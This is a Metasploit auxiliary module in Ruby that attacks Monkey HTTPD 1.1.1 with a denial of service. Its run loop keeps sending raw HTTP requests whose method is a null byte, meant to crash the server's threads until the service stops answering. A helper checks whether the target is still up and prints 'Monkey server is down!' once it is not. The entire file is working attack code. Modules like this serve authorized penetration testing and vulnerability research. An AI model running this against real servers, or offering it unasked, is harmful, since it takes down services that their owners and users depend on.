##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Null Byte Request',
			'Description'    => %q{
				Sending a request containing null bytes causes a
			thread to crash.  If you crash all of the threads,
			the server becomes useless.  Affects version 1.1.1.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL' => 'http://monkey-project.com'],
				],
			'DisclosureDate' => 'May 25, 2013'))

		register_options(
			[
				Opt::RPORT(2001),
			], self.class)
	end

	def is_alive
		begin
			connect
			res = send_request_raw({
				'method' => "GET",
				'uri' => "/"
			})
			if res == nil
				raise ::Rex::ConnectionTimeout
			end
		rescue ::Rex::ConnectionTimeout
			print_good("Monkey server is down!")
		ensure
			disconnect
		end
		return res
	end

	def run
		loop do
			begin
				if ! is_alive
					break
				end
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")

				res = send_request_raw({
					'method' => "\x00",
					'uri' => "/"
				}, timeout = 1)
				sleep 1
				disconnect
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
				break
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_status("Couldn't connect to #{rhost}:#{rport}.")
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
		end
	end
end
